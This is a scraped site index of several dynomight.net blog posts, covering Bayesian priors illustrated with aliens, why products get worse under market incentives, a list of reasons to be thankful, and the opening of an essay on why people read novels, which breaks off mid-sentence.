<p>\u7f51\u7ad9: https://dynomight.net RSS: https://dynomight.net/feed.xml</p>"},{"location":"dynomight.net/#_1","title":"\u6700\u65b0\u6587\u7ae0","text":"<ul> <li>Why read novels-_20260205</li> <li>Good if make prior after data instead of before_20260205</li> <li>Why the chicken crossed the road, according to various entities_20260205</li> <li>Underrated reasons to be thankful V_20260205</li> <li>Make product worse, get money_20260205</li> </ul>"},{"location":"dynomight.net/Good%20if%20make%20prior%20after%20data%20instead%20of%20before_20260205/","title":"Good if make prior after data instead of before","text":"<p>\u6765\u6e90: https://dynomight.net \u94fe\u63a5: https://dynomight.net/prior/ \u65e5\u671f: 2025-12-18T00:00:00+00:00</p> <p>They say you\u2019re supposed to choose your prior in advance. That\u2019s why it\u2019s called a \u201cprior\u201d. First , you\u2019re supposed to say say how plausible different things are, and then you update your beliefs based on what you see in the world.</p> <p>For example, currently you are\u2014I assume\u2014trying to decide if you should stop reading this post and do something else with your life. If you\u2019ve read this blog before, then lurking somewhere in your mind is some prior for how often my posts are good. For the sake of argument, let\u2019s say you think 25% of my posts are funny and insightful and 75% are boring and worthless.</p> <p></p> <p>OK. But now here you are reading these words. If they seem bad/good, then that raises the odds that this particular post is worthless/non-worthless. For the sake of argument again, say you find these words mildly promising, meaning that a good post is 1.5\u00d7 more likely than a worthless post to contain words with this level of quality.</p> <p></p> <p>If you combine those two assumptions, that implies that the probability that this particular post is good is 33.3%. That\u2019s true because the red rectangle below has half the area of the blue one, and thus the probability that this post is good should be half the probability that it\u2019s bad (33.3% vs. 66.6%)</p> <p></p> <p>(Why half the area? Because the red rectangle is \u2153 as wide and \u00b3\u2044\u2082 as tall as the blue one and \u2153 \u00d7 \u00b3\u2044\u2082 = \u00bd. If you only trust equations, click here for equations.) </p> <p>It\u2019s easiest to calculate the ratio of the odds that the post is good versus bad, namely</p> <pre><code>P[good | words] / P[bad | words]\n = P[good, words] / P[bad, words]\n = (P[good] \u00d7 P[words | good])\n / (P[bad] \u00d7 P[words | bad])\n = (0.25 \u00d7 1.5) / (0.75 \u00d7 1)\n = 0.5.\n</code></pre> <p>It follows that</p> <pre><code>P[good | words] = 0.5 \u00d7 P[bad | words],\n</code></pre> <p>and thus that</p> <pre><code>P[good | words] = 1/3.\n</code></pre> <p>Alternatively, if you insist on using Bayes\u2019 equation:</p> <pre><code>P[good | words]\n = P[good] \u00d7 P[words | good] / P[words]\n = P[good] \u00d7 P[words | good]\n / (P[good] \u00d7 P[words | good] + P[bad] \u00d7 P[words | bad])\n = 0.25 \u00d7 1.5 / (0.25 \u00d7 1.5 + 0.75)\n = (1/3)\n</code></pre> <p>Theoretically, when you chose your prior that 25% of dynomight posts are good, that was supposed to reflect all the information you encountered in life before reading this post. Changing that number based on information contained in this post wouldn\u2019t make any sense, because that information is supposed to be reflected in the second step when you choose your likelihood <code>p[good | words]</code>. Changing your prior based on this post would amount to \u201cdouble-counting\u201d.</p> <p>In theory, that\u2019s right. It\u2019s also right in practice for the above example, and for the similar cute little examples you find in textbooks.</p> <p>But for real problems, I\u2019ve come to believe that refusing to change your prior after you see the data often leads to tragedy. The reason is that in real problems, things are rarely just \u201cgood\u201d or \u201cbad\u201d, \u201ctrue\u201d or \u201cfalse\u201d. Instead, truth comes in an infinite number of varieties. And you often can\u2019t predict which of these varieties matter until after you\u2019ve seen the data.</p>"},{"location":"dynomight.net/Good%20if%20make%20prior%20after%20data%20instead%20of%20before_20260205/#aliens","title":"Aliens","text":"<p>Let me show you what I mean. Say you\u2019re wondering if there are aliens on Earth. As far as we know, there\u2019s no reason aliens shouldn\u2019t have emerged out of the random swirling of molecules on some other planet, developed a technological civilization, built spaceships, and shown up here. So it seems reasonable to choose a prior it\u2019s equally plausible that there are aliens or that there are not, i.e. that</p> <pre><code>P[aliens] \u2248 P[no aliens] \u2248 50%.\n</code></pre> <p></p> <p>Meanwhile, here on our actual world, we have lots of weird alien-esque evidence, like the Gimbal video, the Go Fast video, the FLIR1 video, the Wow! signal, government reports on unidentified aerial phenomena, and lots of pilots that report seeing \u201ctic-tacs\u201d fly around in physically impossible ways. Call all that stuff <code>data</code>. If aliens weren\u2019t here, then it seems hard to explain all that stuff. So it seems like <code>P[data | no aliens]</code> should be some low number.</p> <p>On the other hand, if aliens were here, then why don\u2019t we ever get a good image? Why are there endless confusing reports and rumors and grainy videos, but never a single clear close-up high-resolution video, and never any alien debris found by some random person on the ground? That also seems hard to explain if aliens were here. So I think <code>P[data | aliens]</code> should also be some low number. For the sake of simplicity, let\u2019s call it a wash and assume that</p> <pre><code>P[data | no aliens] \u2248 P[data | aliens].\n</code></pre> <p></p> <p>Since neither the prior nor the data see any difference between aliens and no-aliens, the posterior probability is</p> <pre><code>P[no aliens | data] \u2248 P[aliens | data] \u2248 50%.\n</code></pre> <p></p> <p>See the problem?</p> <p>(Click here for math.) </p> <p>Observe that</p> <pre><code>P[aliens | data] / P[no aliens | data]\n = P[aliens, data] / P[no aliens, data]\n = (P[aliens] \u00d7 P[data | aliens])\n / (P[no aliens] \u00d7 P[data | no aliens])\n \u2248 1,\n</code></pre> <p>where the last line follows from the fact that <code>P[aliens] \u2248 P[no aliens]</code> and <code>P[data | aliens] \u2248 P[data | no aliens]</code>. Thus we have that</p> <pre><code>P[aliens | data] \u2248 P[no aliens | data] \u2248 50%.\n</code></pre> <p>We\u2019re friends. We respect each other. So let\u2019s not argue about if my starting assumptions are good. They\u2019re my assumptions. I like them. And yet the final conclusion seems insane to me. What went wrong?</p> <p>Assuming I didn\u2019t screw up the math (I didn\u2019t), the obvious explanation is that I\u2019m experiencing cognitive dissonance as a result of a poor decision on my part to adopt a set of mutually contradictory beliefs. Say you claim that Alice is taller than Bob and Bob is taller than Carlos, but you deny that Alice is taller than Carlos. If so, that would mean that you\u2019re confused, not that you\u2019ve discovered some interesting paradox.</p> <p>Perhaps if I believe that <code>P[aliens] \u2248 P[no aliens]</code> and that <code>P[data | aliens] \u2248 P[data | no aliens]</code>, then I must accept that <code>P[aliens | data] \u2248 P[no aliens | data]</code>. Maybe rejecting that conclusion just means I have some personal issues I need to work on.</p> <p>I deny that explanation. I deny it! Or, at least, I deny that\u2019s it\u2019s most helpful way to think about this situation. To see why, let\u2019s build a second model.</p>"},{"location":"dynomight.net/Good%20if%20make%20prior%20after%20data%20instead%20of%20before_20260205/#more-aliens","title":"More aliens","text":"<p>Here\u2019s a trivial observation that turns out to be important: \u201cThere are aliens\u201d isn\u2019t a single thing. There could be furry aliens, slimy aliens, aliens that like synthwave music, etc. When I stated my prior, I could have given different probabilities to each of those cases. But if I had, it wouldn\u2019t have changed anything, because there\u2019s no reason to think that furry vs. slimy aliens would have any difference in their eagerness to travel to ape-planets and fly around in physically impossible tic-tacs.</p> <p>But suppose I had divided up the state of the world into these four possibilities:</p> possibility description <code>No aliens + normal people</code> There are no aliens. Meanwhile, people are normal and not prone to hallucinating evidence for things that don\u2019t exist. <code>No aliens + weird people</code> There are no aliens. Meanwhile, people are weird and do tend to hallucinate evidence for things that don\u2019t exist. <code>Normal aliens</code> There are aliens. They may or may not have cool spaceships or enjoy shooting people with lasers. But one way or another, they leave obvious, indisputable evidence that they\u2019re around. <code>Weird aliens</code> There are aliens. But they stay hidden until humans get interested in space travel. And after that, they let humans take confusing grainy videos, but never a single good video, never ever, not one. <p>If I had broken things down that way, I might have chosen this prior:</p> <pre><code>P[no aliens + normal people] \u2248 41%\nP[no aliens + weird people] \u2248 9%\nP[normal aliens] \u2248 49%\nP[weird aliens] \u2248 1%\n</code></pre> <p></p> <p>Now, let\u2019s think about the empirical evidence again. It\u2019s incompatible with <code>no aliens + normal people</code>, since if there were no aliens, then normal people wouldn\u2019t hallucinate flying tic-tacs. The evidence is also incompatible with <code>normal aliens</code> since is those kinds of aliens were around they would make their existence obvious. However, the evidence fits pretty well with <code>weird aliens</code> and also with <code>no aliens + weird people</code>.</p> <p>So, a reasonable model would be</p> <pre><code>P[data | normal aliens] \u2248 0 \nP[data | no aliens + normal people] \u2248 0\nP[data | weird aliens] \u2248 P[data | no aliens + weird people].\n</code></pre> <p></p> <p>If we combine those assumptions, now we only get a 10% posterior probability of aliens.</p> <pre><code>P[no aliens + normal people | data] \u2248 0\nP[no aliens + weird people | data] \u2248 90%\nP[normal aliens | data] \u2248 0\nP[weird aliens | data] \u2248 10%\n</code></pre> <p></p> <p>Now the results seem non-insane.</p> <p>(math) </p> <p>To see why, first note that</p> <pre><code>P[normal aliens | data]\n \u2248 P[data | no aliens + normal people]\n \u2248 0,\n</code></pre> <p>since both <code>normal aliens</code> and <code>no aliens + normal people</code> have near-zero probability of producing the observed data.</p> <p>Meanwhile,</p> <pre><code>P[no aliens + weird people | data] / P[weird aliens | data]\n = P[no aliens + weird people, data] / P[weird aliens, data]\n \u2248 P[no aliens + weird people] / P[weird aliens]\n \u2248 .09 / .01\n = 9,\n</code></pre> <p>where the second equality follows from the fact that the data is assumed to be equally likely under <code>no aliens + weird people</code> and <code>weird people</code></p> <p>It follows that</p> <pre><code>P[no aliens + normal people | data]\n \u2248 9 \u00d7 P[weird aliens | data],\n</code></pre> <p>and so</p> <pre><code>P[no aliens + weird people | data] \u2248 90%\nP[weird aliens | data] \u2248 10%.\n</code></pre>"},{"location":"dynomight.net/Good%20if%20make%20prior%20after%20data%20instead%20of%20before_20260205/#huh","title":"Huh?","text":"<p>I hope you are now confused. If not, let me lay out what\u2019s strange: The priors for the two above models both say that there\u2019s a 50% chance of aliens. The first prior wasn\u2019t wrong , it was just less detailed than the second one.</p> <p>That\u2019s weird, because the second prior seemed to lead to completely different predictions. If a prior is non-wrong and the math is non-wrong, shouldn\u2019t your answers be non-wrong? What the hell?</p> <p>The simple explanation is that I\u2019ve been lying to you a little bit. Take any situation where you\u2019re trying to determine the truth of anything. Then there\u2019s some space of things that could be true.</p> <p></p> <p>In some cases, this space is finite. If you\u2019ve got a single tritium atom and you wait a year, either the atom decays or it doesn\u2019t. But in most cases, there\u2019s a large or infinite space of possibilities. Instead of you just being \u201csick\u201d or \u201cnot sick\u201d, you could be \u201chigh temperature but in good spirits\u201d or \u201cseems fine except won\u2019t stop eating onions\u201d.</p> <p>(Usually the space of things that could be true isn\u2019t easy to map to a small 1-D interval. I\u2019m drawing like that for the sake of visualization, but really you should think of it as some high-dimensional space, or even an infinite dimensional space.)</p> <p>In the case of aliens, the space of things that could be true might include, \u201cThere are lots of slimy aliens and a small number of furry aliens and the slimy aliens are really shy and the furry aliens are afraid of squirrels.\u201d So, in principle , what you should do is divide up the space of things that might be true into tons of extremely detailed things and give a probability to each.</p> <p></p> <p>Often, the space of things that could be true is infinite. So theoretically, if you really want to do things by the book, what you should really do is specify how plausible each of those (infinite) possibilities is.</p> <p>After you\u2019ve done that, you can look at the data. For each thing that could be true, you need to think about the probability of the data. Since there\u2019s an infinite number of things that could be true, that\u2019s an infinite number of probabilities you need to specify. You could picture it as some curve like this:</p> <p></p> <p>(That\u2019s a generic curve, not one for aliens.)</p> <p>To me, this is the most underrated problem with applying Bayesian reasoning to complex real-world situations: In practice, there are an infinite number of things that can be true. It\u2019s a lot of work to specify prior probabilities for an infinite number of things. And it\u2019s also a lot of work to specify the likelihood of your data given an infinite number of things.</p> <p>So what do we do in practice? We simplify, usually by limiting creating grouping the space of things that could be true into some small number of discrete categories. For the above curve, you might break things down into these four equally-plausible possibilities.</p> <p></p> <p>Then you might estimate these data probabilities for each of those possibilities.</p> <p></p> <p>Then you could put those together to get this posterior:</p> <p></p> <p>That\u2019s not bad. But it is just an approximation. Your \u201creal\u201d posterior probabilities correspond to these areas:</p> <p></p> <p>That approximation was pretty good. But the reason it was good is that we started out with a good discretization of the space of things that might be true: One where the likelihood of the data didn\u2019t vary too much for the different possibilities inside of <code>A</code>, <code>B</code>, <code>C</code>, and <code>D</code>. Imagine the likelihood of the data\u2014if you were able to think about all the infinite possibilities one by one\u2014looked like this:</p> <p></p> <p>This is dangerous. The problem is that you can\u2019t actually think about all those infinite possibilities. When you think about four four discrete possibilities, you might estimate some likelihood that looks like this:</p> <p></p> <p>If you did that, that would lead to you underestimating the probability of <code>A</code>, <code>B</code>, and <code>C</code>, and overestimating the probability of <code>D</code>.</p> <p>This is where my first model of aliens went wrong. My prior <code>P[aliens]</code> was not wrong. (Not to me.) The mistake was in assigning the same value to <code>P[data | aliens]</code> and <code>P[data | no aliens]</code>. Sure, I think the probability of all our alien-esque data is equally likely given aliens and given no-aliens. But that\u2019s only true for certain kinds of aliens, and certain kinds of no-aliens. And my prior for those kinds of aliens is much lower than for those kinds of non-aliens.</p> <p>Technically, the fix to the first model is simple: Make <code>P[data | aliens]</code> lower. But the reason it\u2019s lower is that I have additional prior information that I forgot to include in my original prior. If I just assert that <code>P[data | aliens]</code> is much lower than <code>P[data | no aliens]</code> then the whole formal Bayesian thing isn\u2019t actually doing very much\u2014I might as well just state that I think <code>P[aliens | data]</code> is low. If I want to formally justify why <code>P[data | aliens]</code> should be lower, that requires a messy recursive procedure where I sort of add that missing prior information and then integrate it out when computing the data likelihood.</p> <p>(math) </p> <p>Mathematically,</p> <pre><code>P[data | aliens]\n = \u222b P[wierd aliens | aliens]\n \u00d7 P[data | wierd aliens] d(weird aliens)\n + \u222b P[normal aliens | aliens]\n \u00d7 P[data | normal aliens] d(normal aliens).\n</code></pre> <p>But now I have to give a detailed prior anyway. So what was the point of starting with a simple one?</p> <p>I don\u2019t think that technical fix is very good. While it\u2019s technically correct (har-har) it\u2019s very unintuitive. The better solution is what I did in the second model: To create a finer categorization of the space of things that might be true, such that the probability of the data is constant-ish for each term.</p> <p>The thing is: Such a categorization depends on the data. Without seeing the actual data in our world, I would never have predicted that we would have so many pilots that report seeing tic-tacs. So I would never have predicted that I should have categories that are based on how much people might hallucinate evidence or how much aliens like to mess with us. So the only practical way to get good results is to first look at the data to figure out what categories are important, and then to ask yourself how likely you would have said those categories were, if you hadn\u2019t yet seen any of the evidence.</p>"},{"location":"dynomight.net/Make%20product%20worse%2C%20get%20money_20260205/","title":"Make product worse, get money","text":"<p>\u6765\u6e90: https://dynomight.net \u94fe\u63a5: https://dynomight.net/worse/ \u65e5\u671f: 2025-11-20T00:00:00+00:00</p> <p>I recently asked why people seem to hate dating apps so much. In response, 80% of you emailed me some version of the following theory:</p> <p>The thing about dating apps is that if they do a good job and match people up, then the matched people will quit the app and stop paying. So they have an incentive to string people along but not to actually help people find long-term relationships.</p> <p>May I explain why I don\u2019t find this type of theory very helpful?</p> <p>I\u2019m not saying that I think it\u2019s wrong, mind you. Rather, my objection is that while the theory is phrased in terms of dating apps, the same basic pattern applies to basically anyone who is trying to make money by doing anything.</p> <p>For example, consider a pizza restaurant. Try these theories on for size:</p> <ul> <li> <p>Pizza: \u201cThe thing about pizza restaurants is that if they use expensive ingredients or labor-intensive pizza-making techniques, then it costs more to make pizza. So they have an incentive to use low-cost ingredients and labor-saving shortcuts.\u201d</p> </li> <li> <p>Pizza II: \u201cThe thing about pizza restaurants is that if they have nice tables separated at a comfortable distance, then they can\u2019t fit as many customers. So they have an incentive to use tiny tables and cram people in cheek by jowl.\u201d</p> </li> <li> <p>Pizza III: \u201cThe thing about pizza restaurants is that if they sell big pizzas, then people will eat them and stop being hungry, meaning they don\u2019t buy additional pizza. So they have an incentive to serve tiny low-calorie pizzas.\u201d</p> </li> </ul> <p>See what I mean? You can construct similar theories for other domains, too:</p> <ul> <li> <p>Cars: \u201cThe thing about automakers is that making cars safe is expensive. So they have an incentive to make unsafe cars.\u201d</p> </li> <li> <p>Videos: \u201cThe thing about video streaming is that high-resolution video uses more expensive bandwidth. So they have an incentive to use low-resolution.\u201d</p> </li> <li> <p>Blogging: \u201cThe thing about bloggers is that research is time-consuming. So they have an incentive to be sloppy about the facts.\u201d</p> </li> <li> <p>Durability: \u201cThe thing about {lightbulb, car, phone, refrigerator, cargo ship} manufacturing is that if you make a {lightbulb, car, phone, refrigerator, cargo ship} that lasts a long time, then people won\u2019t buy new ones. So there\u2019s an incentive to make {lightbulbs, cars, phones, refrigerators, cargo ships} that break quickly.\u201d</p> </li> </ul> <p>All these theories can be thought of as instances of two general patterns:</p> <ul> <li> <p>Make product worse, get money: \u201cThe thing about selling goods or services is that making goods or services better costs money. So people have an incentive to make goods and services worse.\u201d</p> </li> <li> <p>Raise price, get money: \u201cThe thing about selling goods and services is that if you raise prices, then you get more money. So people have an incentive to raise prices.\u201d</p> </li> </ul> <p>Are these theories wrong? Not exactly. But it sure seems like something is missing.</p> <p>I\u2019m sure most pizza restauranteurs would be thrilled to sell lukewarm 5 cm cardboard discs for $300 each. They do in fact have an incentive to do that, just as predicted by these theories! Yet, in reality, pizza restaurants usually sell pizzas that are made out of food. So clearly these theories aren\u2019t telling the whole story.</p> <p>Say you have a lucrative business selling 5 cm cardboard discs for $300. I am likely to think, \u201cI like money. Why don\u2019t I sell pizzas that are only mostly cardboard, but also partly made of flour? And why don\u2019t I sell them for $200, so I can steal Valued Reader\u2019s customers?\u201d But if I did that, then someone else would probably set prices at only $100, or even introduce cardboard-free pizzas, and this would continue until hitting some kind of equilibrium.</p> <p>Sure, producers want to charge infinity dollars for things that cost them zero dollars to make. But consumers want to pay zero dollars for stuff that\u2019s infinitely valuable. It\u2019s in the conflict between these desires that all interesting theories live.</p> <p>This is why I don\u2019t think it\u2019s helpful to point out that people have an incentive to make their products worse. Of course they do. The interesting question is, why are they able to get away with it?</p>"},{"location":"dynomight.net/Make%20product%20worse%2C%20get%20money_20260205/#reasons-stuff-is-bad","title":"Reasons stuff is bad","text":"<p>First reason stuff is bad: People are cheap</p> <p>Why are seats so cramped on planes? Is it because airlines are greedy? Sure. But while they might be greedy, I don\u2019t think they\u2019re dumb. If you do a little math, you can calculate that if airlines were to remove a single row of seats, they could add perhaps 2.5 cm (1 in) of extra legroom for everyone, while only decreasing the number of paying customers by around 3%. (This is based on a 737 with single-class, but you get the idea.)</p> <p>So why don\u2019t airlines rip out a row of seats, raise prices by 3% and enjoy the reduced costs for fuel and customer service? The only answer I can see is that people, on average, aren\u2019t actually willing to pay 3% more for 2.5 cm more legroom. We want a worse but cheaper product, and so that\u2019s what we get.</p> <p>I think this is the most common reason stuff is \u201cbad\u201d. It\u2019s why Subway sandwiches are so soggy, why video games are so buggy, and why IKEA furniture and Primark clothes fall apart so quickly.</p> <p>It\u2019s good when things are bad for this reason. Or at least, that\u2019s the premise of capitalism: When companies cut costs, that\u2019s the invisible hand redirecting resources to maximize social value, or whatever. Companies may be motivated by greed. And you may not like it, since you want to pay zero dollars for infinite value. But this is markets working as designed.</p> <p>Second reason stuff is bad: Information asymmetries</p> <p>Why is it that almost every book / blog / podcast about longevity is such garbage? Well, we don\u2019t actually know many things that will reliably increase longevity. And those things are mostly all boring / hard / non-fun. And even if you do all of them, it probably only adds a couple of years in expectation. And telling people these facts is not a good way to find suckers who will pay you lots of money for your unproven supplements / seminars / etc.</p> <p>True! But it doesn\u2019t explain why all longevity stuff is so bad. Why don\u2019t honest people tell the true story and drive all the hucksters out of business? I suspect the answer is that unless you have a lot of scientific training and do a lot of research, it\u2019s basically impossible to figure out just how huckstery all the hucksters really are.</p> <p>I think this same basic phenomenon explains why some supplements contain heavy metals, why some food contains microplastics, why restaurants use so much butter and salt, why rentals often have crappy insulation, and why most cars seem to only be safe along dimensions included in crash test scores. When consumers can\u2019t tell good from evil, evil triumphs.</p> <p>Third reason stuff is bad: People have bad taste</p> <p>Sometimes stuff is bad because people just don\u2019t appreciate the stuff you consider good. Examples are definitionally controversial, but I think this includes restaurants in cities where all restaurants are bad, North American tea, and travel pants. This reason has a blurry boundary with information asymmetries, as seen in ultrasonic humidifiers or products that use Sucralose instead of aspartame for \u201csafety\u201d.</p> <p>Fourth reason stuff is bad: Pricing power</p> <p>Finally, sometimes stuff is bad because markets aren\u2019t working. Sometimes a company is selling a product but has some kind of \u201cmoat\u201d that makes it hard for anyone else to compete with them, e.g. because of some technological or regulatory barrier, control of some key resource or location, intellectual property, a beloved brand, or network effects.</p> <p>If that\u2019s true, then those companies don\u2019t have to worry as much about someone else stealing their business, and so (because everyone is axiomatically greedy) they will find ways to make their product cheaper and/or raise prices up until the price is equal to the full value it provides to the marginal consumer.</p>"},{"location":"dynomight.net/Make%20product%20worse%2C%20get%20money_20260205/#conclusion","title":"Conclusion","text":"<p>Why is food so expensive at sporting events? Yes, people have no alternatives. But people know food is expensive at sporting events. And they don\u2019t like it. Instead of selling water for $17, why don\u2019t venues sell water for $2 and raise ticket prices instead? I don\u2019t know. Probably something complicated, like that expensive food allows you to extract extra money from rich people without losing business from non-rich people.</p> <p>So of course dating apps would love to string people along for years instead of finding them long-term relationships, so they keep paying money each month. I wouldn\u2019t be surprised if some people at those companies have literally thought, \u201cMaybe we should string people along for years instead of finding them long-term relationships, so they keep paying money each month, I love money so much.\u201d</p> <p>But if they are actually doing that (which is unclear to me) or if they are bad in some other way, then how do they get away with it? Why doesn\u2019t someone else create a competing app that\u2019s better and thereby steal all their business? It seems like the answer has to be either \u201cbecause that\u2019s impossible\u201d or \u201cbecause people don\u2019t really want that\u201d. That\u2019s where the mystery begins.</p>"},{"location":"dynomight.net/Underrated%20reasons%20to%20be%20thankful%20V_20260205/","title":"Underrated reasons to be thankful V","text":"<p>\u6765\u6e90: https://dynomight.net \u94fe\u63a5: https://dynomight.net/thanks-5/ \u65e5\u671f: 2025-11-27T00:00:00+00:00</p> <ol> <li> <p>That your dog, while she appears to love you only because she\u2019s been adapted by evolution to appear to love you, really does love you.</p> </li> <li> <p>That if you\u2019re a life form and you cook up a baby and copy your genes to them, you\u2019ll find that the genes have been degraded due to oxidative stress et al., which isn\u2019t cause for celebration, but if you find some other hopefully-hot person and randomly swap in half of their genes, your baby will still be somewhat less fit compared to you and your hopefully-hot friend on average, but now there is variance, so if you cook up several babies, one of them might be as fit or even fitter than you, and that one will likely have more babies than your other babies have, and thus complex life can persist in a universe with increasing entropy.</p> </li> <li> <p>That if we wanted to, we surely could figure out which of the 300-ish strains of rhinovirus are circulating in a given area at a given time and rapidly vaccinate people to stop it and thereby finally \u201ccure\u201d the common cold, and though this is too annoying to pursue right now, it seems like it\u2019s just a matter of time.</p> </li> <li> <p>That if you look back at history, you see that plagues went from Europe to the Americas but not the other way, which suggests that urbanization and travel are great allies for infectious disease, and these both continue today but are held in check by sanitation and vaccines even while we have lots of tricks like UVC light and high-frequency sound and air filtration and waste monitoring and paying people to stay home that we\u2019ve barely even put in play.</p> </li> <li> <p>That while engineered infectious diseases loom ever-larger as a potential very big problem, we also have lots of crazier tricks we could pull out like panopticon viral screening or toilet monitors or daily individualized saliva sampling or engineered microbe-resistant surfaces or even dividing society into cells with rotating interlocks or having people walk around in little personal spacesuits, and while admittedly most of this doesn\u2019t sound awesome, I see no reason this shouldn\u2019t be a battle that we would win.</p> </li> <li> <p>That clean water, unlimited, almost free.</p> </li> <li> <p>That dentistry.</p> </li> <li> <p>That tongues.</p> </li> <li> <p>That radioactive atoms either release a ton of energy but also quickly stop existing\u2014a gram of Rubidium-90 scattered around your kitchen emits as much energy as ~200,000 incandescent lightbulbs but after an hour only 0.000000113g is left\u2014or don\u2019t put out very much energy but keep existing for a long time\u2014a gram of Carbon-14 only puts out the equivalent of 0.0000212 light bulbs but if you start with a gram, you\u2019ll still have 0.999879g after a year\u2014so it isn\u2019t actually that easy to permanently poison the environment with radiation although Cobalt-60 with its medium energy output and medium half-life is unfortunate, medical applications notwithstanding I still wish Cobalt-60 didn\u2019t exist, screw you Cobalt-60.</p> </li> <li> <p>That while curing all cancer would only increase life expectancy by ~3 years and curing all heart disease would only increase life expectancy by ~3 years, and preventing all accidents would only increase life expectancy by ~1.5 years, if we did all of these at the same time and then a lot of other stuff too, eventually the effects would go nonlinear, so trying to cure cancer isn\u2019t actually a waste of time, thankfully.</p> </li> <li> <p>That the peroxisome, while the mitochondria and their stupid Krebs cycle get all the attention, when a fatty-acid that\u2019s too long for them to catabolize comes along, who you gonna call.</p> </li> <li> <p>That we have preferences, that there\u2019s no agreed ordering of how good different things are, which is neat, and not something that would obviously be true for an alien species, and given our limited resources probably makes us happier on net.</p> </li> <li> <p>That cardamom, it is cheap but tastes expensive, if cardamom cost 1000\u00d7 more, people would brag about how they flew to Sri Lanka so they could taste chai made with fresh cardamom and swear that it changed their whole life.</p> </li> <li> <p>That Gregory of Nyssa, he was right.</p> </li> <li> <p>That Grandma Moses, it\u2019s not too late.</p> </li> <li> <p>That sleep, that probably evolution first made a low-energy mode so we don\u2019t starve so fast and then layered on some maintenance processes, but the effect is that we live in a cycle and when things aren\u2019t going your way it\u2019s comforting that reality doesn\u2019t stretch out before you indefinitely but instead you can look forward to a reset and a pause that\u2019s somehow neither experienced nor skipped.</p> </li> <li> <p>That, glamorous or not, comfortable or not, cheap or not, carbon emitting or not, air travel is very safe.</p> </li> <li> <p>That, for most of the things you\u2019re worried about, the markets are less worried than you and they have the better track record, though not the issue of your mortality.</p> </li> <li> <p>That sexual attraction to romantic love to economic unit to reproduction, it\u2019s a strange bundle, but who are we to argue with success.</p> </li> <li> <p>That every symbolic expression recursively built from differentiable elementary functions has a derivative that can also be written as a recursive combination of elementary functions, although the latter expression may require vastly more terms.</p> </li> <li> <p>That every expression graph built from differentiable elementary functions and producing a scalar output has a gradient that can itself be written as an expression graph, and furthermore that the latter expression graph is always the same size as the first one and is easy to find, and thus that it\u2019s possible to fit very large expression graphs to data.</p> </li> <li> <p>That, eerily, biological life and biological intelligence does not appear to make use of that property of expression graphs.</p> </li> <li> <p>That if you look at something and move your head around, you observe the entire light field, which is a five-dimensional function of three spatial coordinates and two angles, and yet if you do something fancy with lasers, somehow that entire light field can be stored on a single piece of normal two-dimensional film and then replayed later.</p> </li> <li> <p>That, as far as I can tell, the reason five-dimensional light fields can be stored on two-dimensional film simply cannot be explained without quite a lot of wave mechanics, a vivid example of the strangeness of this place and proof that all those physicists with their diffractions and phase conjugations really are up to something.</p> </li> <li> <p>That disposable plastic, littered or not, harmless when consumed as thousands of small particles or not, is popular for a reason.</p> </li> <li> <p>That disposable plastic, when disposed of correctly, is literally carbon sequestration, and that if/when air-derived plastic replaces dead-plankton-derived plastic, this might be incredibly convenient, although it must be said that currently the carbon in disposable plastic only represents a single-digit percentage of total carbon emissions.</p> </li> <li> <p>That rocks can be broken into pieces and then you can\u2019t un-break the pieces but you can check that they came from the same rock, it\u2019s basically cryptography.</p> </li> <li> <p>That the deal society has made is that if you have kids then everyone you encounter is obligated to chip in a bit to assist you, and this seems to mostly work without the need for constant grimy negotiated transactions as Econ 101 would suggest, although the exact contours of this deal seem to be a bit murky.</p> </li> <li> <p>That of all the humans that have ever lived, the majority lived under some kind of autocracy, with the rest distributed among tribal bands, chiefdoms, failed states, and flawed democracies, and only something like 1% enjoyed free elections and the rule of law and civil liberties and minimal corruption, yet we endured and today that number is closer to 10%, and so if you find yourself outside that set, do not lose heart.</p> </li> <li> <p>That if you were in two dimensions and you tried to eat something then maybe your body would split into two pieces since the whole path from mouth to anus would have to be disconnected, so be thankful you\u2019re in three dimensions, although maybe you could have some kind of jigsaw-shaped digestive tract so your two pieces would only jiggle around or maybe you could use the same orifice for both purposes, remember that if you ever find yourself in two dimensions, I guess.</p> </li> </ol> <p>(previously, previously, previously, previously)</p>"},{"location":"dynomight.net/Why%20read%20novels-_20260205/","title":"Why read novels?","text":"<p>\u6765\u6e90: https://dynomight.net \u94fe\u63a5: https://dynomight.net/novels/ \u65e5\u671f: 2026-01-22T00:00:00+00:00</p> <p>Why should you read novels? We tell children they\u2019re magic carpets for the mind / exercise for the soul instead of the body / lighthouses in the great sea of time. But aren\u2019t they ultimately a form of entertainment?</p> <p>Many years ago, I read Crime and Punishment. Here, with no research and no notes, is what I can remember about that book:</p> <ol> <li>It was pretty good.</li> <li>There was some guy, I think named Ras-something.</li> <li>He was really angsty/edgy and lived in a small apartment or attic.</li> <li>One day, for no particular reason, he killed an old woman.</li> <li>Having done this random murder, he became even more angsty/edgy.</li> <li>Then there was this police inspector guy.</li> <li>The inspector kept coming after Ras-whoever and making extremely long philosophical rants.</li> <li>Those rants may or may not have represented the personal views of Fyodor Dostoevsky.</li> <li>I can\u2019t remember how the book ended. Surely Ras-whoever didn\u2019t live happily ever after? But was he caught or did he confess? No idea.</li> </ol> <p>This is probably below average. I know people who seem to remember every detail of everything they read. But even if you\u2019re one of them, so what? Is remembering those books better than remembering whatever else you would have done with your time if you hadn\u2019t been reading?</p> <p>And yet: If I\u2019m on vacation and I spend an afternoon reading a novel where in the mountains or on a beach, I feel like I\u2019m living my best life. Whereas if I spent an afternoon staring at short videos on my phone, I\u2019m sure I\u2019d feel like a gigantic loser. So what\u2019s going on here?</p>"},{"location":"dynomight.net/Why%20read%20novels-_20260205/#theory-1-ye-olde-status","title":"Theory 1: Ye olde status","text":"<p>The obvious explanation is that there\u2019s nothing intrinsically great about reading novels. The reason we think it\u2019s great is that reading novels\u2014at least the right ones\u2014is high status. It\u2019s a way of playing the Glass Bead Game, a way of collecting cultural capital for you to lord over other people who don\u2019t have as much time or education as you do. It may feel like you \u201cactually enjoy reading\u201d, but that\u2019s because you\u2019re a desperate striver that subconsciously shape-shifts into whatever you think will make you look fancy. Apologize for reading. Apologize!</p> <p>I think there is something in this. However, I\u2019m also pretty sure it\u2019s not the full explanation, and I\u2019m bored to death with everyone trying to explain everything this way. So let\u2019s move on.</p>"},{"location":"dynomight.net/Why%20read%20novels-_20260205/#theory-2-diminishing-returns","title":"Theory 2: Diminishing returns","text":"<p>Say you can\u2019t read novels. Maybe because you\u2019re illiterate, maybe because you have no attention span, maybe because you can\u2019t tear yourself away from Candy Clicker. Now, say you cultivate the ability to read novels. Whatever issues you address in that process, it seems like it will clearly be good for you, right?</p> <p>Under this 